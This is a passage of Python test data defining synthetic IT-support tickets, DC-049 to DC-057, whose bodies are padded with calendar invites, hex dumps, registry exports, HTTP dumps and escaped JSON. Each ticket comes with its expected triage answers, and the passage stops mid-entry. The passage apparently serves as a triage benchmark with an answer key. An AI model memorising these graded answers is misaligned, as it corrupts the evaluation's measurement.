            tags=["data-cleanup", "corrupted-headers", "smtp-headers", "raw-email"],
            difficulty="hard",
        ),
        # ── DC-049  Embedded vCalendar / ICS invite noise in body ─────────
        ScenarioDefinition(
            scenario_id="DC-049",
            subject="Teams meeting keeps dropping — need to reschedule bridge",
            description=(
                "Hi IT Support,\n\n"
                "Our daily stand-up Teams meeting keeps dropping participants after about "
                "15 minutes. Everyone gets the 'reconnecting…' spinner and then gets "
                "kicked out. This has been happening since Monday.\n\n"
                "Here is the calendar invite for reference:\n\n"
                "BEGIN:VCALENDAR\n"
                "VERSION:2.0\n"
                "PRODID:-//Microsoft Corporation//Outlook 16.0 MIMEDIR//EN\n"
                "METHOD:REQUEST\n"
                "BEGIN:VTIMEZONE\n"
                "TZID:Eastern Standard Time\n"
                "BEGIN:STANDARD\n"
                "DTSTART:16011104T020000\n"
                "RRULE:FREQ=YEARLY;BYDAY=1SU;BYMONTH=11\n"
                "TZOFFSETFROM:-0400\n"
                "TZOFFSETTO:-0500\n"
                "END:STANDARD\n"
                "BEGIN:DAYLIGHT\n"
                "DTSTART:16010311T020000\n"
                "RRULE:FREQ=YEARLY;BYDAY=2SU;BYMONTH=3\n"
                "TZOFFSETFROM:-0500\n"
                "TZOFFSETTO:-0400\n"
                "END:DAYLIGHT\n"
                "END:VTIMEZONE\n"
                "BEGIN:VEVENT\n"
                "DTSTART;TZID=Eastern Standard Time:20260316T093000\n"
                "DTEND;TZID=Eastern Standard Time:20260316T094500\n"
                "RRULE:FREQ=DAILY;BYDAY=MO,TU,WE,TH,FR\n"
                "UID:040000008200E00074C5B7101A82E00800000000B0A5F912\n"
                "SUMMARY:Daily Stand-up — Platform Engineering\n"
                "ORGANIZER;CN=Rachel Torres:mailto:rachel.torres@contoso.com\n"
                "ATTENDEE;ROLE=REQ-PARTICIPANT;CN=Dev Team:mailto:dev-team@contoso.com\n"
                "LOCATION:Microsoft Teams Meeting\n"
                "DESCRIPTION:Join link: https://teams.microsoft.com/l/meetup-join/"
                "19%3ameeting_NjQ4YzM2ZDAtOGUwNi00MmQ3LThlMjctNDg5ZjYxNWQyMzIy"
                "%40thread.v2/0?context=%7b%22Tid%22%3a%2272f988bf-86f1-41af-91ab-"
                "2d7cd011db47%22%7d\n"
                "X-MICROSOFT-CDO-BUSYSTATUS:BUSY\n"
                "X-MICROSOFT-CDO-IMPORTANCE:1\n"
                "X-MICROSOFT-DISALLOW-COUNTER:FALSE\n"
                "BEGIN:VALARM\n"
                "TRIGGER:-PT15M\n"
                "ACTION:DISPLAY\n"
                "DESCRIPTION:Reminder\n"
                "END:VALARM\n"
                "END:VEVENT\n"
                "END:VCALENDAR\n\n"
                "The meeting ID is 234 567 890# and the passcode is 2xJk94. "
                "We have about 12 people on the call each day. A few of us are in "
                "the London office and the rest are in New York. Thanks."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate recurring Teams meeting drops affecting the daily stand-up "
                "for Platform Engineering — 12 participants across New York and London "
                "offices are getting kicked out after ~15 minutes."
            ),
            remediation_steps=[
                "Check Teams admin center call analytics for the recurring meeting "
                "to identify packet loss or jitter patterns.",
                "Review network quality for cross-region calls between New York and "
                "London offices during the 09:30 ET window.",
                "Verify that the Teams client version is current for all participants.",
                "Check if the meeting exceeds any tenant policy limits (participant count, duration, bandwidth).",
                "If network quality is the cause, work with Network Operations to "
                "investigate QoS policies for Teams media traffic on the cross-Atlantic link.",
            ],
            reporter_name="Rachel Torres",
            reporter_email="rachel.torres@contoso.com",
            reporter_department="Platform Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "vcalendar-noise", "ics-data", "calendar-invite"],
            difficulty="medium",
        ),
        # ── DC-050  Hex dump pasted into email ────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-050",
            subject="Shared drive corrupted file — hex dump attached",
            description=(
                "Hi,\n\n"
                "A critical Excel file on the shared drive (\\\\NYC-FS-01\\Finance\\Q1-Reports\\"
                "revenue_summary.xlsx) seems to be corrupted. When I try to open it, Excel "
                "says the file format is not valid. I ran hexdump on it and the header "
                "doesn't look right:\n\n"
                "00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 b5 55  |PK..........!..U|\n"
                "00000010  30 23 f4 00 00 00 4c 02  00 00 13 00 08 02 5b 43  |0#....L.......[C|\n"
                "00000020  6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d  |ontent_Types].xm|\n"
                "00000030  6c 20 a2 04 02 28 a0 00  02 00 00 00 00 00 00 00  |l ...(.........|\n"
                "00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n"
                "*\n"
                "00000100  00 00 00 00 00 00 00 00  ff ff ff ff ff ff ff ff  |................|\n"
                "00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n"
                "*\n"
                '00000200  3c 3f 78 6d 6c 20 76 65  72 73 69 6f 6e 3d 22 31  |<?xml version="1|\n'
                '00000210  2e 30 22 20 65 6e 63 6f  64 69 6e 67 3d 22 55 54  |.0" encoding="UT|\n'
                '00000220  46 2d 38 22 3f 3e 0d 0a  00 00 00 00 00 00 00 00  |F-8"?>..........|\n'
                "00000230  00 00 00 00 00 00 00 00  ff ff ff ff ff ff ff ff  |................|\n"
                "00000240  00 00 00 00 00 00 00 00  3c 54 79 70 65 73 20 78  |........<Types x|\n"
                '00000250  6d 6c 6e 73 3d 22 68 74  74 70 3a 2f 2f 73 63 68  |mlns="http://sch|\n'
                "00000260  65 6d 61 73 2e 6f 70 65  6e 78 6d 6c 66 6f 72 6d  |emas.openxmlform|\n"
                "00000270  61 74 73 2e 6f 72 67 2f  70 61 63 6b 61 67 65 2f  |ats.org/package/|\n"
                "00000280  32 30 30 36 2f 63 6f 6e  74 65 6e 74 2d 74 79 70  |2006/content-typ|\n"
                '00000290  65 73 22 3e 0d 0a 00 00  00 00 00 00 00 00 00 00  |es">............|\n\n'
                "The file was last modified yesterday at 4:47 PM by an automated ETL process "
                "that runs on PROD-ETL-03. The file is about 2.4 MB and contains Q1 revenue "
                "data that we need for the board presentation tomorrow morning. Other files "
                "in the same directory seem fine.\n\n"
                "Thanks,\nAisha Rahman\nFinance, Building 1, 7th floor"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate corrupted Excel file on \\\\NYC-FS-01\\Finance\\Q1-Reports — "
                "ZIP header appears partially zeroed out. Check the ETL process on "
                "PROD-ETL-03 and restore from Volume Shadow Copy or backup."
            ),
            remediation_steps=[
                "Attempt to restore the file from Volume Shadow Copy on NYC-FS-01 "
                "using a snapshot from before 4:47 PM yesterday.",
                "If no shadow copy is available, restore from the nightly backup.",
                "Investigate the PROD-ETL-03 ETL process logs for errors during "
                "yesterday's 4:47 PM run that may have caused partial write or corruption.",
                "Check disk health on NYC-FS-01 for I/O errors or SMART warnings.",
                "Once restored, verify file integrity by opening in Excel and "
                "validating the ZIP structure with a tool like 7-Zip.",
            ],
            reporter_name="Aisha Rahman",
            reporter_email="aisha.rahman@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "hex-dump", "binary-data", "file-corruption"],
            difficulty="hard",
        ),
        # ── DC-051  Double-encoded HTML entities ──────────────────────────
        ScenarioDefinition(
            scenario_id="DC-051",
            subject="Login page shows garbled text &amp;mdash; can&amp;#39;t sign in",
            description=(
                "Hi IT,\n\n"
                "When I go to the internal portal at https://portal.contoso.com, the "
                "login page is showing garbled text. The page title shows:\n\n"
                "  &amp;ldquo;Contoso&amp;nbsp;Financial&amp;nbsp;Services "
                "&amp;mdash;&amp;nbsp;Sign&amp;nbsp;In&amp;rdquo;\n\n"
                "And the form labels say:\n"
                "  &amp;bull; &amp;ldquo;Username&amp;rdquo;\n"
                "  &amp;bull; &amp;ldquo;Password&amp;rdquo;\n"
                "  &amp;bull; &amp;ldquo;Remember&amp;nbsp;Me&amp;rdquo;\n\n"
                "The &amp;ldquo;Sign In&amp;rdquo; button text shows as "
                "&amp;quot;Sign&amp;nbsp;In&amp;quot; and when I click it, I get "
                "an error:\n\n"
                "  &amp;lt;div class=&amp;quot;error&amp;quot;&amp;gt;\n"
                "    &amp;lt;p&amp;gt;Authentication failed: invalid "
                "token&amp;lt;/p&amp;gt;\n"
                "  &amp;lt;/div&amp;gt;\n\n"
                "I&amp;#39;ve tried clearing my cache and using a different "
                "browser (Chrome &amp;amp; Edge) but the issue persists. "
                "I&amp;#39;m on Windows 11 in the New York office, "
                "Building 2.\n\n"
                "This is blocking me from accessing the compliance reporting "
                "dashboard.\n\n"
                "Thanks,\n"
                "Victor Okafor\n"
                "Compliance &amp;amp; Regulatory"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate double-encoded HTML entities on the internal portal "
                "login page at portal.contoso.com — the authentication endpoint "
                "is also returning errors. Likely a deployment issue with the "
                "template rendering engine."
            ),
            remediation_steps=[
                "Check the most recent deployment to portal.contoso.com for template "
                "rendering changes that may be double-encoding HTML entities.",
                "Verify the web application's content-type headers and character "
                "encoding settings (UTF-8 vs ISO-8859-1).",
                "Check the authentication token endpoint for errors — the 'invalid "
                "token' error may be related to the encoding issue corrupting CSRF tokens.",
                "Roll back to the previous known-good deployment if the issue is confirmed to be a recent change.",
                "Test the portal from multiple browsers and networks to confirm the "
                "fix resolves the rendering and authentication issues.",
            ],
            reporter_name="Victor Okafor",
            reporter_email="victor.okafor@contoso.com",
            reporter_department="Compliance & Regulatory",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "double-encoded-html", "html-entities", "encoding-corruption"],
            difficulty="medium",
        ),
        # ── DC-052  Chat transcript with bot messages and timestamps ──────
        ScenarioDefinition(
            scenario_id="DC-052",
            subject="Slack to Teams migration — pasted chat history for context",
            description=(
                "[2026-03-16 14:23:01] @jennifer.walsh: hey can anyone help? my laptop "
                "keeps blue-screening\n"
                "[2026-03-16 14:23:05] 🤖 ContosBot: Hi Jennifer! I see you might have a "
                "technical issue. Would you like me to create a support ticket? "
                "React with 👍 to confirm or 👎 to dismiss.\n"
                "[2026-03-16 14:23:12] @jennifer.walsh reacted with 👍\n"
                "[2026-03-16 14:23:15] 🤖 ContosBot: Great! Ticket INC-TEMP-8834 created. "
                "A technician will reach out shortly.\n"
                "[2026-03-16 14:24:30] @mike.chen: @jennifer.walsh what's the error code on "
                "the blue screen?\n"
                "[2026-03-16 14:25:01] @jennifer.walsh: it says KERNEL_DATA_INPAGE_ERROR "
                "and then restarts\n"
                "[2026-03-16 14:25:45] @mike.chen: that's usually a disk issue. how old is "
                "your laptop?\n"
                "[2026-03-16 14:26:10] @jennifer.walsh: it's a Lenovo ThinkPad X1 Carbon "
                "Gen 11, got it about 18 months ago\n"
                "[2026-03-16 14:26:30] 🤖 ContosBot: 📊 Daily standup reminder: Your "
                "standup is in 4 minutes! Don't forget to post your update in "
                "#platform-standup.\n"
                "[2026-03-16 14:27:00] @jennifer.walsh: also it's been running really slow "
                "lately and I can hear the fan going crazy even when I'm just in Outlook\n"
                "[2026-03-16 14:27:30] @mike.chen: definitely sounds like the SSD might be "
                "failing. @jennifer.walsh you should ask IT to run diagnostics\n"
                "[2026-03-16 14:28:00] 🤖 ContosBot: 🎉 Kudos! @sarah.park just received "
                "a kudos from @david.kim: 'Great work on the Q1 dashboard!'\n"
                "[2026-03-16 14:28:15] @jennifer.walsh: ok forwarding this chat to IT. "
                "the blue screen happens 2-3 times a day, always when I have lots of "
                "tabs open in Chrome and am running Excel with large spreadsheets.\n"
                "[2026-03-16 14:28:30] @jennifer.walsh: I'm on the 4th floor Building 1, "
                "New York\n"
                "[2026-03-16 14:28:45] 🤖 ContosBot: 📅 Meeting update: 'Client Review "
                "Call' has been moved to 3:30 PM today."
            ),
            category=Category.HARDWARE,
            priority=Priority.P2,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Run SSD and hardware diagnostics on Jennifer Walsh's Lenovo ThinkPad "
                "X1 Carbon Gen 11 — recurring KERNEL_DATA_INPAGE_ERROR blue screens "
                "2-3 times daily suggest possible SSD failure."
            ),
            remediation_steps=[
                "Run Lenovo Vantage hardware diagnostics focusing on SSD health "
                "(SMART status, read/write error rates, reallocated sector count).",
                "Check Windows Event Viewer for disk-related errors (Event IDs 7, 11, "
                "51, 153) around the times of the blue screens.",
                "If SSD is degrading, immediately back up user data and arrange a replacement drive or laptop swap.",
                "As a temporary measure, reduce Chrome tab count and consider moving "
                "large Excel workbooks to OneDrive streaming to reduce disk I/O.",
                "Once hardware is confirmed healthy or replaced, monitor for recurrence over the next 48 hours.",
            ],
            reporter_name="Jennifer Walsh",
            reporter_email="jennifer.walsh@contoso.com",
            reporter_department="Data Science",
            channel=Channel.CHAT,
            tags=["data-cleanup", "chat-transcript", "bot-messages", "timestamps", "emoji-noise"],
            difficulty="medium",
        ),
        # ── DC-053  Windows Registry export dump ──────────────────────────
        ScenarioDefinition(
            scenario_id="DC-053",
            subject="Outlook keeps resetting default signature — registry export included",
            description=(
                "Hi IT,\n\n"
                "Every time I restart Outlook, my email signature resets to the old one "
                "from 2024 instead of my updated signature. I export the registry key to "
                "show you what it looks like:\n\n"
                "Windows Registry Editor Version 5.00\n\n"
                "[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\"
                "Outlook\\9375CFF0413111d3B88A00104B2A6676\\00000002]\n"
                '"Account Name"="corporate.email@contoso.com"\n'
                '"New Signature"="Contoso_Corporate_2024"\n'
                '"Reply-Forward Signature"="Contoso_Corporate_2024"\n'
                '"Identity Eid"=hex:00,00,00,00,dc,a7,40,c8,c0,42,10,1a,b4,b9,08,00,2b,2f,e1,82,\\\n'
                "  01,00,00,00,03,00,00,00\n"
                '"Identity Search Key"=hex:dc,a7,40,c8,c0,42,10,1a,b4,b9,08,00,2b,2f,e1,82,01,\\\n'
                "  00,00,00,03,00,00,00\n\n"
                "[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Common\\MailSettings]\n"
                '"NewSignature"="Contoso_Corporate_2024"\n'
                '"ReplySignature"="Contoso_Corporate_2024"\n'
                '"Stationery"=""\n'
                '"ComposeFontComplex"=hex:3c,68,74,6d,6c,3e,0d,0a,0d,0a,3c,68,65,61,64,3e,0d,\\\n'
                "  0a,3c,73,74,79,6c,65,3e,0d,0a\n"
                '"ReplyFontComplex"=hex:3c,68,74,6d,6c,3e,0d,0a,0d,0a,3c,68,65,61,64,3e,0d,0a,\\\n'
                "  3c,73,74,79,6c,65,3e,0d,0a\n\n"
                "[HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Setup]\n"
                '"First-Run"=dword:00000001\n'
                '"ImportPRF"=""\n'
                '"CreateWelcome"=dword:00000000\n\n'
                "As you can see, the registry still points to 'Contoso_Corporate_2024' "
                "but my updated signature is called 'Contoso_Corporate_2026'. I think "
                "the Group Policy is pushing the old signature name. I've tried manually "
                "editing the registry but it gets overwritten on restart.\n\n"
                "I'm running Outlook version 16.0.18025.20160 on Windows 11 Enterprise.\n\n"
                "Thanks,\nKenichi Tanaka\nClient Services"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Investigate Group Policy Object overriding Outlook email signature "
                "setting — registry shows 'Contoso_Corporate_2024' being pushed over "
                "user's updated 'Contoso_Corporate_2026' signature on every restart."
            ),
            remediation_steps=[
                "Check the Group Policy Object (GPO) linked to the user's OU for "
                "Outlook signature settings that may be enforcing the old signature name.",
                "Run 'gpresult /H gpresult.html' on the user's machine to confirm "
                "which GPO is applying the signature preference.",
                "Update the GPO to reference 'Contoso_Corporate_2026' or remove the "
                "forced signature setting if individual choice is now permitted.",
                "Run 'gpupdate /force' on the user's machine after the GPO change.",
                "Verify the signature persists across an Outlook restart and confirm with the user.",
            ],
            reporter_name="Kenichi Tanaka",
            reporter_email="kenichi.tanaka@contoso.com",
            reporter_department="Client Services",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "registry-dump", "binary-data", "configuration-noise"],
            difficulty="medium",
        ),
        # ── DC-054  HTTP request/response headers dump ────────────────────
        ScenarioDefinition(
            scenario_id="DC-054",
            subject="Internal API returning 502 — full request/response dump",
            description=(
                "Hi team,\n\n"
                "The internal pricing API (pricing-api.contoso.internal) is returning 502 "
                "Bad Gateway errors intermittently. I captured the full request and response "
                "with curl -v:\n\n"
                "> GET /api/v2/pricing/equity/MSFT HTTP/1.1\n"
                "> Host: pricing-api.contoso.internal\n"
                "> User-Agent: curl/8.4.0\n"
                "> Accept: application/json\n"
                "> Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1U"
                "STFNakExTkRNMk9EazJNVGMxTnpNNE5ETXlPVEExTlRjM1FqZEdPVUZDTlRVM05qVT"
                "ROdyJ9.eyJpc3MiOiJodHRwczovL2NvbnRvc28uYXV0aDAuY29tLyIsInN1YiI6ImF1"
                "dGgwfDYxNTQ5ZjBjODQ2ZDYzMDA2OWQwNzJhMyIsImF1ZCI6WyJodHRwczovL3ByaW"
                "NpbmctYXBpLmNvbnRvc28uaW50ZXJuYWwiXX0.fakesignature\n"
                "> X-Request-ID: 7f3a2b4c-9d1e-4f5a-b6c8-3e2d1f0a9b8c\n"
                "> X-Correlation-ID: trade-exec-20260317-001\n"
                "> Cache-Control: no-cache\n"
                "> Connection: keep-alive\n"
                ">\n"
                "< HTTP/1.1 502 Bad Gateway\n"
                "< Server: nginx/1.24.0\n"
                "< Date: Tue, 17 Mar 2026 14:23:45 GMT\n"
                "< Content-Type: text/html\n"
                "< Content-Length: 166\n"
                "< Connection: keep-alive\n"
                "< X-Request-ID: 7f3a2b4c-9d1e-4f5a-b6c8-3e2d1f0a9b8c\n"
                "< X-Upstream-Status: failed\n"
                "< X-Upstream-Addr: 10.30.2.15:8080, 10.30.2.16:8080, 10.30.2.17:8080\n"
                "< X-Upstream-Response-Time: 30.001, 30.002, 30.003\n"
                "< X-Cache-Status: BYPASS\n"
                "< Strict-Transport-Security: max-age=31536000; includeSubDomains\n"
                "< X-Content-Type-Options: nosniff\n"
                "< X-Frame-Options: DENY\n"
                "< Content-Security-Policy: default-src 'none'\n"
                "< Referrer-Policy: no-referrer\n"
                "<\n"
                "< <html>\n"
                "< <head><title>502 Bad Gateway</title></head>\n"
                "< <body>\n"
                "< <center><h1>502 Bad Gateway</h1></center>\n"
                "< <hr><center>nginx/1.24.0</center>\n"
                "< </body>\n"
                "< </html>\n\n"
                "The upstream response times are all ~30s which looks like a timeout. "
                "All three backend nodes (10.30.2.15-17) are failing. This is affecting "
                "our trading desk because they can't get real-time equity pricing. "
                "It started about 30 minutes ago.\n\n"
                "Ben Hartley\nEquity Trading, NYC"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P1,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate 502 Bad Gateway on pricing-api.contoso.internal — all three "
                "upstream backend nodes (10.30.2.15-17:8080) are timing out at 30s. "
                "Trading desk is blocked from real-time equity pricing."
            ),
            remediation_steps=[
                "Check health and resource utilization (CPU, memory, disk I/O) on all "
                "three upstream backend nodes (10.30.2.15, .16, .17).",
                "Review application logs on the pricing API service for errors or connection pool exhaustion.",
                "Check the nginx reverse proxy configuration and upstream timeout settings.",
                "Verify the downstream data provider (market data feed) is responding "
                "and not causing the backend to hang.",
                "If a backend restart is needed, perform a rolling restart to maintain "
                "partial availability during recovery.",
            ],
            reporter_name="Ben Hartley",
            reporter_email="ben.hartley@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.CHAT,
            tags=["data-cleanup", "http-headers", "curl-output", "request-response-dump"],
            difficulty="hard",
        ),
        # ── DC-055  CID inline image references (broken Content-ID) ──────
        ScenarioDefinition(
            scenario_id="DC-055",
            subject="Desktop icons rearranged after reboot — screenshots inline",
            description=(
                "Hi IT Support,\n\n"
                "Every time I restart my computer, all my desktop icons get rearranged "
                "into a random order. I spent 20 minutes organizing them and then after "
                "a Windows Update reboot they're all scrambled again.\n\n"
                "Here's what it looks like before (organized):\n"
                '<img src="cid:image001.png@01DAF2B3.A1B2C3D4" alt="Before" '
                'width="1920" height="1080">\n'
                "[cid:image001.png@01DAF2B3.A1B2C3D4 — image not displayed]\n\n"
                "And after the reboot (scrambled):\n"
                '<img src="cid:image002.png@01DAF2B3.E5F6A7B8" alt="After" '
                'width="1920" height="1080">\n'
                "[cid:image002.png@01DAF2B3.E5F6A7B8 — image not displayed]\n\n"
                "I also noticed the icon cache seems broken because some icons show "
                "as generic white rectangles:\n"
                '<img src="cid:image003.png@01DAF2B3.C9D0E1F2" alt="Broken Icons" '
                'width="800" height="600">\n'
                "[cid:image003.png@01DAF2B3.C9D0E1F2 — image not displayed]\n\n"
                "------=_Part_12345_67890.1710680400000\n"
                'Content-Type: image/png; name="image001.png"\n'
                "Content-Transfer-Encoding: base64\n"
                "Content-ID: <image001.png@01DAF2B3.A1B2C3D4>\n"
                'Content-Disposition: inline; filename="image001.png"\n\n'
                "[base64 data stripped by mail gateway]\n\n"
                "------=_Part_12345_67890.1710680400000\n"
                'Content-Type: image/png; name="image002.png"\n'
                "Content-Transfer-Encoding: base64\n"
                "Content-ID: <image002.png@01DAF2B3.E5F6A7B8>\n"
                'Content-Disposition: inline; filename="image002.png"\n\n'
                "[base64 data stripped by mail gateway]\n\n"
                "I'm on Windows 11 Enterprise, Lenovo ThinkPad T14s, Building 3, "
                "5th floor.\n\n"
                "Thanks,\nPriya Mehta\nPortfolio Management"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P4,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate desktop icon rearrangement and icon cache corruption on "
                "Windows 11 Enterprise — icons scramble after every reboot. Low priority "
                "cosmetic issue but may indicate a profile or Group Policy conflict."
            ),
            remediation_steps=[
                "Check if a Group Policy or profile management tool (e.g., FSLogix) "
                "is resetting the desktop layout on logon.",
                "Clear and rebuild the icon cache by deleting the IconCache.db file and restarting Explorer.",
                "Verify the desktop icon layout is not being managed by a mandatory "
                "profile or a desktop management GPO.",
                "Check if the Windows Update that triggered the reboot included "
                "a shell or Explorer update that could cause layout resets.",
                "If the issue persists, save the layout using a DesktopOK-style utility or a logon script workaround.",
            ],
            reporter_name="Priya Mehta",
            reporter_email="priya.mehta@contoso.com",
            reporter_department="Portfolio Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "cid-references", "inline-image", "mime-parts", "broken-images"],
            difficulty="medium",
        ),
        # ── DC-056  Escaped JSON within JSON (triple-escaped) ─────────────
        ScenarioDefinition(
            scenario_id="DC-056",
            subject="API error with nested JSON — can't parse response",
            description=(
                "Our integration with the compliance reporting API is failing. The API "
                "returns an error response, but the error body contains triple-escaped "
                "JSON that's nearly impossible to read. Here's the raw response:\n\n"
                '{"status":"error","code":500,"message":"Internal processing failure",'
                '"details":"{\\"pipeline\\":\\"compliance-etl-v2\\",\\"stage\\":\\"transform'
                '\\",\\"error\\":{\\"type\\":\\"SchemaValidationError\\",\\"message\\":'
                '\\"Field \\\\\\\\\\\\\\"transaction_id\\\\\\\\\\\\\\" expected type '
                '\\\\\\\\\\\\\\"string\\\\\\\\\\\\\\" but received '
                '\\\\\\\\\\\\\\"null\\\\\\\\\\\\\\"\\",\\"context\\":{\\"record_number\\"'
                ':45892,\\"batch_id\\":\\"BATCH-20260317-0923\\",\\"source_table\\":\\"dbo'
                '.RawTransactions\\",\\"target_schema\\":\\"{\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"'
                'fields\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\":[{\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"name'
                '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"transaction_id'
                '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\",'
                '\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\":\\\\\\\\\\\\\\\\'
                '\\\\\\\\\\\\\\\\\\"string\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"}]}\\"}}}"\n\n'
                "The actual issue is that null transaction_id values are getting through "
                "from the RawTransactions table in batch BATCH-20260317-0923, which started "
                "at 9:23 AM today. This is breaking the compliance ETL pipeline and we "
                "can't generate the daily regulatory report.\n\n"
                "The pipeline runs on our Azure Data Factory instance "
                "(adf-contoso-prod-eastus2). We need this fixed before the 5 PM "
                "regulatory filing deadline.\n\n"
                "James O'Brien\nRegulatory Affairs"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P1,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.AFFECTED_SYSTEM, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate null transaction_id values in dbo.RawTransactions causing "
                "the compliance ETL pipeline (compliance-etl-v2) on Azure Data Factory "
                "to fail — regulatory filing deadline is 5 PM today."
            ),
            remediation_steps=[
                "Query dbo.RawTransactions for records with NULL transaction_id in "
                "batch BATCH-20260317-0923 to assess the scope of the data quality issue.",
                "Check the upstream data source that feeds RawTransactions for changes "
                "in schema or NULL handling that may have introduced the bad records.",
                "Manually patch or exclude the NULL transaction_id records to unblock "
                "the current batch and allow the ETL pipeline to complete.",
                "Add a NOT NULL constraint or pre-validation step in the ADF pipeline "
                "to catch these issues at ingestion time.",
                "Re-trigger the compliance-etl-v2 pipeline for batch BATCH-20260317-0923 "
                "after the data is corrected, and verify the regulatory report generates.",
            ],
            reporter_name="James O'Brien",
            reporter_email="james.obrien@contoso.com",
            reporter_department="Regulatory Affairs",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "escaped-json", "nested-json", "triple-escaped", "json-payload"],
            difficulty="hard",
        ),
        # ── DC-057  Tab-separated spreadsheet data pasted in email ────────
        ScenarioDefinition(
            scenario_id="DC-057",
            subject="VPN users table — some accounts are locked",
            description=(
                "Hi IT,\n\n"
                "Several VPN users are getting locked out of their accounts. I pulled "
                "a report from our VPN concentrator and pasted it here. The users "
                "marked 'LOCKED' in the Status column need to be unlocked:\n\n"
                "Username\tFull Name\tDepartment\tLast Login\tStatus\tIP Address\t"
                "VPN Client\tOS\n"
                "jsmith01\tJohn Smith\tTrading\t2026-03-17 08:12:04\tACTIVE\t"
                "10.100.5.23\tGlobalProtect 6.1\tWindows 11\n"
                "mchen02\tMei Chen\tCompliance\t2026-03-17 08:14:22\tLOCKED\t"
                "10.100.5.45\tGlobalProtect 6.1\tWindows 11\n"
                "agarcia03\tAna Garcia\tFinance\t2026-03-17 08:15:01\tACTIVE\t"
                "10.100.5.67\tGlobalProtect 6.0\tmacOS 14.4\n"
                "bwilson04\tBen Wilson\tEngineering\t2026-03-17 08:16:33\tLOCKED\t"
                "10.100.5.89\tGlobalProtect 6.1\tWindows 11\n"
                "cpatel05\tChitra Patel\tRisk Management\t2026-03-17 08:17:15\t"
                "ACTIVE\t10.100.5.101\tGlobalProtect 6.1\tWindows 11\n"
                "dkimura06\tDaichi Kimura\tData Engineering\t2026-03-16 17:42:08\t"
                "LOCKED\t10.100.5.123\tGlobalProtect 6.1\tWindows 10\n"
                "efernandez07\tElena Fernandez\tHR\t2026-03-17 08:19:44\tACTIVE\t"
                "10.100.5.145\tGlobalProtect 6.0\tmacOS 14.4\n"
                "fjohansson08\tFreya Johansson\tLegal\t2026-03-16 16:30:12\t"
                "LOCKED\t10.100.5.167\tGlobalProtect 6.1\tWindows 11\n"
                "gthompson09\tGrace Thompson\tWealth Management\t2026-03-17 08:22:55\t"
                "ACTIVE\t10.100.5.189\tGlobalProtect 6.1\tWindows 11\n"
                "hsingh10\tHarpreet Singh\tIT Security\t2026-03-17 08:23:30\t"
                "ACTIVE\t10.100.5.201\tGlobalProtect 6.1\tWindows 11\n"
                "iali11\tIbrahim Ali\tFixed Income\t2026-03-16 15:55:00\tLOCKED\t"
                "10.100.5.223\tGlobalProtect 5.3\tWindows 10\n"
                "jnovak12\tJana Novak\tClient Services\t2026-03-17 08:25:10\t"
                "ACTIVE\t10.100.5.245\tGlobalProtect 6.1\tWindows 11\n\n"
                "So that's 5 locked accounts (mchen02, bwilson04, dkimura06, "
                "fjohansson08, iali11). They all seem to have been locked out this "
                "morning. We think it might be related to the password policy change "
                "that was pushed last night. These users are all remote today and "
                "can't work without VPN.\n\n"
                "Kevin Abrams\nNetwork Operations"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
